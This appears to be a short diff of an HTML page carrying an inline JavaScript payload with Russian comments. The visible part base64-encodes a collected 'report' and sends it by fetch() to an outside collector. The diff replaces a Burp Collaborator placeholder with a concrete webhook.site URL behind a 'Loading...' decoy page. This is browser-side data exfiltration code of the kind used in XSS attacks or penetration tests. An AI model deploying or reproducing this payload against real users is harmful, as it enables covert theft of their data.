@@ -18,9 +18,9 @@
     // 3. Кодируем всё в Base64 для передачи без ошибок
     var encodedData = btoa(unescape(encodeURIComponent(report)));
 
-    // 4. Отправляем в Burp Collaborator
+    // 4. Отправляем
     // Замените YOUR_ID на ваш реальный ID из Burp
-    fetch('https://YOUR_ID.oastify.com/?data=' + encodedData);
+    fetch('https://webhook.site/8b31d71f-32ab-418d-9e3f-e9dd72738799/?data=' + encodedData);
 })();
 </script>
 <h1>Loading...</h1>
